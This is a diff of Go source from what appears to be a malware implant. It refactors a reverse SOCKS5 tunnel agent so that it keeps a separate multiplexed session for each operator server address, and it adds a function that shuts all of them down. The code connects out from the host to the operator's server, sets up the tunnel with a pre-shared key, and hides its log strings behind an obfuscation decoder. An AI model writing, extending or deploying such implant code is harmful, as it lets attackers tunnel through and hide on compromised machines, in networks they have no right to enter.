@@ -1,10 +1,10 @@
 package Proxy
 
 import (
-	"fmt"
-	"implant/core/obfs"
 	"crypto/sha256"
 	"crypto/tls"
+	"fmt"
+	"implant/core/obfs"
 	"implant/core/services/proxy/bufferpool"
 	"implant/core/services/proxy/mux"
 	"log"
@@ -27,10 +27,10 @@ var (
 	}
 )
 var (
-	// K7: Session 以互斥锁保护——原裸全局变量在 agent goroutine 写 / 停止命令读之间
-	// 存在数据竞争；且重复启动会覆盖旧会话导致其无法被停止（goroutine 泄漏）。
+	// 每个 serverAddress 独立 mux 会话：同一客户端可同时运行多个反向 SOCKS5 隧道。
+	// 旧实现只有一个全局 Session，第二个隧道会顶掉第一个。
 	sessionMu sync.Mutex
-	Session   *mux.Mux
+	Sessions  = make(map[string]*mux.Mux)
 )
 
 // deriveTunnelMagic 从会话 PSK 派生 64 字节魔法包（与服务端 DeriveMagicPacket 一致）
@@ -50,7 +50,7 @@ func ReverseSocksAgent(serverAddress, psk string, useTLS bool) {
 	log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM6JoFqBpVvUx5FDcyQDKAyuhyUKEE7KKijfdWslG56Y="))
 	log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM6JoH6tpWuAT5mfayDDmADqfoA=="))
 	log.Printf("%s", fmt.Sprintf(obfs.Dec("JmneH0WhXmWHW+clZ9GDM3LXrA1pVfkT5FDVyRbvAyeAf5BHYsFKVw=="), serverAddress))
-	log.Printf("%s", fmt.Sprintf(obfs.Dec("JmneH0WhXmWHW+clZ9GDM3LXrA1p4zbV6E/LyTXh3JsV/g=="),  len(psk)))
+	log.Printf("%s", fmt.Sprintf(obfs.Dec("JmneH0WhXmWHW+clZ9GDM3LXrA1p4zbV6E/LyTXh3JsV/g=="), len(psk)))
 	log.Printf("%s", fmt.Sprintf(obfs.Dec("JmneH0WhXmWHW+clZ9GDM3LXrA1pV9gh5k7ceMMU3JsV7A=="), useTLS))
 
 	// 🔧 添加重试机制
@@ -98,22 +98,21 @@ func ReverseSocksAgent(serverAddress, psk string, useTLS bool) {
 
 		log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM7BrCQCgHvF4sk+RoAqiaSrZGowh0HGKrgo="))
 
-		// 创建多路复用会话
+		// 创建多路复用会话（同一 serverAddress 重连时替换旧会话，其它地址保留）
 		log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM6JoGKBpVu0F5GHOySvdDgyff6lKv3XHwCmhOtE8Yieq"))
+		session := mux.Server(conn, psk)
 		sessionMu.Lock()
-		// K7: 幂等——已有会话则先关闭旧会话，防止重复启动泄漏
-		if Session != nil {
-			Session.Close()
-			Session = nil
+		if old := Sessions[serverAddress]; old != nil {
+			old.Close()
 		}
-		Session = mux.Server(conn, psk)
+		Sessions[serverAddress] = session
 		sessionMu.Unlock()
 		log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM7BrCQCsF/92tnWRiAKgchPUJpcv93yKkyfeWuVE97M="))
 
 		log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM6JoGK1pVMgX5GTxyhPKAzGRf5RvvW7+zCCMNeQlqrwFAOiFKrw4ZNsG"))
 
 		for {
-			stream, err := Session.AcceptStream()
+			stream, err := session.AcceptStream()
 			if err != nil {
 				log.Printf("%s", fmt.Sprintf(obfs.Dec("JmneH0WhXmWHW+clZ9GDM7BqAACvPcB7jk2SmQ6iQgrYLqj9eMQZ"), err))
 				break
@@ -131,10 +130,10 @@ func ReverseSocksAgent(serverAddress, psk string, useTLS bool) {
 		}
 
 		log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM6JoGLppVuAt6E3ZySvdDgyff6lKv3XHwCmhOtE8Yieq"))
+		session.Close()
 		sessionMu.Lock()
-		if Session != nil {
-			Session.Close()
-			Session = nil
+		if Sessions[serverAddress] == session {
+			delete(Sessions, serverAddress)
 		}
 		sessionMu.Unlock()
 
@@ -145,14 +144,17 @@ func ReverseSocksAgent(serverAddress, psk string, useTLS bool) {
 	log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM6JoGLppVuoT5Erlf8AErejVNK8h0FaIjzreZcxEzZViRfU="))
 }
 
-// StopReverseSocks5 停止反向SOCKS5隧道：关闭全局会话，
-// 使 AcceptStream 返回错误并终止 agent goroutine（真正关闭而非仅回执）
+// StopReverseSocks5 停止全部反向SOCKS5会话（全局清理/关闭命令）。
 func StopReverseSocks5() {
 	sessionMu.Lock()
-	defer sessionMu.Unlock()
-	if Session != nil {
+	sessions := make([]*mux.Mux, 0, len(Sessions))
+	for k, s := range Sessions {
+		sessions = append(sessions, s)
+		delete(Sessions, k)
+	}
+	sessionMu.Unlock()
+	for _, s := range sessions {
 		log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM6JoF7FpVfEo5FLEyQr0Dyydf5x6vFrLyym3N/sSpZ4pDdiWKaIMGbpr/VDblXaHbvA0"))
-		Session.Close()
-		Session = nil
+		s.Close()
 	}
 }
